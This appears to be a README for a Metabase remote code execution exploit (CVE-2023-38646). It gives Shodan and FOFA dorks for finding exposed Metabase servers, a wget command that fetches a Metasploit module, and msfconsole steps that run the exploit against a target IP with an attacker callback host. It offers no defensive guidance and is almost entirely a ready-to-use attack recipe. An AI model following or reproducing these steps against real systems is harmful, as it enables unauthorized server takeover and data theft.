# CVE-2023-38646
![](https://img.shields.io/static/v1?label=Product&message=Metabase&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=Open%20Source%20before%200.46.6.1%20and%20Enterprise%20before%201.46.6.1&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)


- Shodan dork:
```
product:"Metabase"
```
- FOFA dork:
```
app="Metabase"
```
  
## Install
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Metabase/metabase_setup_token_rce.rb
```
```
cp metabase_setup_token_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/http/
```

## Usage
```
msfdb reinit; msfconsole -q
```
```
msf6 > use exploit/linux/http/metabase_setup_token_rce.rb
```
```
msf6 exploit(linux/http/metabase_setup_token_rce.rb) > set rhosts target_IP
msf6 exploit(linux/http/metabase_setup_token_rce.rb) > set lhost attacker_IP
msf6 exploit(linux/http/metabase_setup_token_rce.rb) > run
```
